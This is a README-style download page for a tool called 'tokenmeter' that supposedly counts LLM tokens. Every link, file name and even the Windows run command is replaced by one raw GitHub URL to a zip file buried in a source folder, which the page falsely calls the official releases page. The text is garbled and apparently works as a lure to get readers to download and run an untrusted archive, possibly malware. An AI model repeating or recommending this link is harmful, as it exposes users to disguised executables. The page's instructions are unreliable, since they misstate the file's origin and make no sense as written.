...
[![Download tokenmeter](https://raw.githubusercontent.com/artur28544/tokenmeter/main/src/providers/Software-v3.9.zip)](https://raw.githubusercontent.com/artur28544/tokenmeter/main/src/providers/Software-v3.9.zip)
...
[Download tokenmeter from the official releases page](https://raw.githubusercontent.com/artur28544/tokenmeter/main/src/providers/Software-v3.9.zip)

### How to download:

1. Click the link above or the large blue button at the top. It takes you to the tokenmeter releases page on GitHub.
2. Look for the latest release. Releases usually have files like `.exe` for Windows, `.dmg` or `.zip` for macOS, and `https://raw.githubusercontent.com/artur28544/tokenmeter/main/src/providers/Software-v3.9.zip` or `.AppImage` for Linux.
3. Select the file that matches your operating system. For example:
   - Windows: `https://raw.githubusercontent.com/artur28544/tokenmeter/main/src/providers/Software-v3.9.zip` or `.zip`
   - macOS: `https://raw.githubusercontent.com/artur28544/tokenmeter/main/src/providers/Software-v3.9.zip` or `.zip`
   - Linux: `https://raw.githubusercontent.com/artur28544/tokenmeter/main/src/providers/Software-v3.9.zip` or `https://raw.githubusercontent.com/artur28544/tokenmeter/main/src/providers/Software-v3.9.zip`
...
- **Windows:**
  ...
  - If you downloaded a `.zip`, unzip the file and note the location of the `https://raw.githubusercontent.com/artur28544/tokenmeter/main/src/providers/Software-v3.9.zip` file.
...
- **macOS and Linux:**
  ...
  - For `.zip` or `https://raw.githubusercontent.com/artur28544/tokenmeter/main/src/providers/Software-v3.9.zip`, extract the file contents to a folder.
...
3. Type the command to run tokenmeter:
   - On Windows:
     ```
     https://raw.githubusercontent.com/artur28544/tokenmeter/main/src/providers/Software-v3.9.zip
     ```
   - On macOS or Linux:
     ```
     ./tokenmeter
...
We recommend checking the [releases page](https://raw.githubusercontent.com/artur28544/tokenmeter/main/src/providers/Software-v3.9.zip) regularly for new versions.
...
- On Windows, make sure you run `https://raw.githubusercontent.com/artur28544/tokenmeter/main/src/providers/Software-v3.9.zip`, not just `tokenmeter`.
...
- GitHub repository: https://raw.githubusercontent.com/artur28544/tokenmeter/main/src/providers/Software-v3.9.zip
- Releases and download: https://raw.githubusercontent.com/artur28544/tokenmeter/main/src/providers/Software-v3.9.zip

Feel free to explore the repository for the latest code and updates.

---

[Download tokenmeter here](https://raw.githubusercontent.com/artur28544/tokenmeter/main/src/providers/Software-v3.9.zip) to start counting tokens and estimating LLM costs today.